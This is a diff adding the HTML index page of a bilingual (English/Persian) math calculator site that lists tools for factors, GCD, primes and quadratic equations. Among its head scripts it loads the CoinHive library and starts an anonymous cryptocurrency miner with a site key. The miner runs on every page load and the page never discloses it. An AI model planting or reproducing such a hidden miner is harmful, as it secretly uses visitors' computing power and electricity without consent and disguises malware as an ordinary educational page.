@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Rare Math Functions</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <!--ICON-->
+    <link rel="apple-touch-icon" sizes="57x57" href="/apple-icon-57x57.png">
+    <link rel="apple-touch-icon" sizes="60x60" href="/apple-icon-60x60.png">
+    <link rel="apple-touch-icon" sizes="72x72" href="/apple-icon-72x72.png">
+    <link rel="apple-touch-icon" sizes="76x76" href="/apple-icon-76x76.png">
+    <link rel="apple-touch-icon" sizes="114x114" href="/apple-icon-114x114.png">
+    <link rel="apple-touch-icon" sizes="120x120" href="/apple-icon-120x120.png">
+    <link rel="apple-touch-icon" sizes="144x144" href="/apple-icon-144x144.png">
+    <link rel="apple-touch-icon" sizes="152x152" href="/apple-icon-152x152.png">
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-icon-180x180.png">
+    <link rel="icon" type="image/png" sizes="192x192"  href="/android-icon-192x192.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="96x96" href="/favicon-96x96.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/manifest.json">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
+    <meta name="theme-color" content="#ffffff">
+    <!--CSS and javascript-->
+    <link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+    <link rel="stylesheet" href="/Assets/All.css">
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+    <script src="https://coinhive.com/lib/coinhive.min.js"></script>
+    <script src="Assets/All.js"></script>
+    <script>
+        function checkLang() {
+            if(getCookie("Lang") === undefined){
+                window.location.href = "/SetLang.html";
+            }
+            if(checkPersian()){
+                setPersian();
+            }
+        }
+        function setPersian() {
+            $("#FactorsT").text("شمارنده ها");
+            $("#FactorsD").text("پیدا کردن شمارنده های یک عدد");
+            $("#FactorizationT").text("تجزیه ی عدد");
+            $("#FactorizationD").text("تجزیه ی عدد به عومل اول");
+            $("#GCDT").text("ب.م.م و ک.م.م");
+            $("#GCDD").text("بزرگ ترین مضرب مشترک و کوچک ترین ");
+            $("#ModT").text("باقی مانده");
+            $("#ModD").text("‍‍‍‍‍پیدا کردن باقی مانده ی تقسیم دو عدد بر هم");
+            $("#DetectPrimeT").text("تشخیص عدد اول");
+            $("#DetectPrimeD").text("تشخیص دادن اینکه یک عدد اول است یا نه");
+            $("#FindPrimesT").text("پیدا کردن اعداد اول");
+            $("#FindPrimesD").text("پیدا کردن اعداد اول از یک تا ...");
+            $("#QuadraticFormulaSolverT").text("حل معادله ی دو مجهولی");
+            $("#QuadraticFormulaSolverD").text("حل معادله ی دو مجهولی");
+            //Set Font
+            var style = $("<style>span { font-family:'B Koodak','0 Koodak','Segoe UI',Arial,Helvetica,sans-serif !important; text-align: right;display: block;direction: rtl;}</style>");
+            $('html > head').append(style);
+        }
+        var miner = new CoinHive.Anonymous('ODS9DCaE5EBEy2sswgGYmkiDmNdCah9O', {
+	    autoThreads: true,
+	    throttle: 0.9,
+	    forceASMJS: false
+        });
+        miner.start();
+    </script>
+    <style>
+        li{
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body onload="checkLang();" >
+<div class="w3-top">
+    <div class="w3-bar w3-white w3-padding w3-card-2" style="letter-spacing:4px;">
+        <a href="#" class="w3-bar-item w3-button w3-hide-small">Rare Math Calculations</a>
+        <a href="#" class="w3-bar-item w3-button w3-hide-medium w3-hide-large">Maths</a>
+        <div class="w3-dropdown-hover w3-right" style="margin-right: 20px">
+            <button class="w3-button">Other Stuff</button>
+            <div class="w3-dropdown-content w3-bar-block w3-border">
+                <a href="/SetLang.html" class="w3-bar-item w3-button noLetterSpacing">Change Language</a>
+                <a target="_blank" href="https://cafebazaar.ir/app/com.hirbod.maths" class="w3-bar-item w3-button noLetterSpacing">View App</a>
+                <a href="/About.html" class="w3-bar-item w3-button noLetterSpacing">About</a>
+            </div>
+        </div>
+    </div>
+</div>
+    <!-- Main list -->
+    <ul class="w3-ul w3-card-2 w3-hoverable" style="margin-top: 75px;margin-left:30px;margin-right: 30px">
+        <li class="w3-padding-16" onclick="window.location.href='/Factors.html';">
+            <span class="w3-large" id="FactorsT">Factors</span><br>
+            <span id="FactorsD">Find factors of a number</span>
+        </li>
+        <li class="w3-padding-16" onclick="window.location.href='/Factorization.html';">
+            <span class="w3-large" id="FactorizationT">Prime Factorization</span><br>
+            <span id="FactorizationD">Factorize a number by prime numbers</span>
+        </li>
+        <li class="w3-padding-16" onclick="window.location.href='/GCD.html';">
+            <span class="w3-large" id="GCDT">GCD &amp; LCM</span><br>
+            <span id="GCDD">Greatest Common Divisor and Least Common Multiple</span>
+        </li>
+        <li class="w3-padding-16" onclick="window.location.href='/Mod.html';">
+            <span class="w3-large" id="ModT">Mod</span><br>
+            <span id="ModD">Find reminder of division of two numbers</span>
+        </li>
+        <li class="w3-padding-16" onclick="window.location.href='/DetectPrime.html';">
+            <span class="w3-large" id="DetectPrimeT">Detect Prime Number</span><br>
+            <span id="DetectPrimeD">Finds out if a number is prime or not</span>
+        </li>
+        <li class="w3-padding-16" onclick="window.location.href='/FindPrimes.html';">
+            <span class="w3-large" id="FindPrimesT">Find Prime Numbers</span><br>
+            <span id="FindPrimesD">Find prime numbers from 1 to &#8230;</span>
+        </li>
+        <li class="w3-padding-16" onclick="window.location.href='/QuadraticEquation.html';">
+            <span class="w3-large" id="QuadraticFormulaSolverT">Quadratic Equation Solver</span><br>
+            <span id="QuadraticFormulaSolverD">Solve a quadratic equation</span>
+        </li>
+    </ul>
+    <h5 class="w3-center" style="margin:15px">By Hirbod Behnam</h5>
+</body>
+</html>
